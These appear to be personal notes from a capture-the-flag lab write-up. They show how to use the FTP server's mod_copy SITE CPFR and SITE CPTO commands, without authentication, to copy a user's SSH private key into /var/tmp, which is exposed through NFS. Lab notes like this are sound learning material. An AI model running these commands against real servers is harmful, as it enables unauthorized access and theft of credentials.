---
title: Copy Private Key from FTP Server to /VAR Directory
updated: 2023-03-24T16:13:33.0000000+04:00
created: 2023-03-24T16:07:36.0000000+04:00
---

Copy Private Key from FTP Server to /VAR Directory
Friday, March 24, 2023
4:07 PM

Connect to the FTP server again using netcat

- Command \| nc 10.10.94.61 21

Using the mod_copy module implements SITE CPFR and SITE CPTO commands, which can be used to copy files/directories from one place to another on the server. Any unauthenticated client can leverage these commands to copy files from any part of the filesystem to a chosen destination.

**<u>Do as followed:</u>**

SITE CPFR /home/kenobi/.ssh/id_rsa

![image1](image1-240.png)

- This was basically found when we connected to the SMB share and looked through the log.txt

![image2](image2-105.png)

- Now next command inside the FTP server:

SITE CPTO /var/tmp/id_rsa

![image3](image3-66.png)

-- Reason for choosing the VAR, is because that we found it was a mount from the previous NFS enumeration scans.

